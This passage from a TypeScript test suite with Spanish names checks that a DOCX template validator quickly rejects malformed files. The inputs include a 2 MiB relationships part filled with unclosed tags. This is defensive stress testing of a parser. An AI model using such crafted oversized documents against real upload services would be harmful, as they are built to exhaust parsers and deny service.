      ], { almacenado: true });
      expect(medir(file('a.docx', DOCX_MIME, contenido))).toBeLessThan(LIMITE_MS);
      expect(() => validatePlantillaFile(file('a.docx', DOCX_MIME, contenido))).toThrow(BadRequestException);
    });

    it('DOCX con un .rels de 2 MiB lleno de `<Relationship ` sin cerrar', () => {
      const contenido = docx([
        ['[Content_Types].xml', CONTENT_TYPES], ['_rels/.rels', '<Relationships/>'],
        ['word/document.xml', '<w:document xmlns:w="urn:w"><w:body/></w:document>'],
        ['word/_rels/document.xml.rels', repetir('<Relationships xmlns="urn:r">', '<Relationship ', '', 2 * MiB - 64)],
      ], { almacenado: true });
      expect(medir(file('a.docx', DOCX_MIME, contenido))).toBeLessThan(LIMITE_MS);
      expect(() => validatePlantillaFile(file('a.docx', DOCX_MIME, contenido))).toThrow(BadRequestException);
    });
  });
});
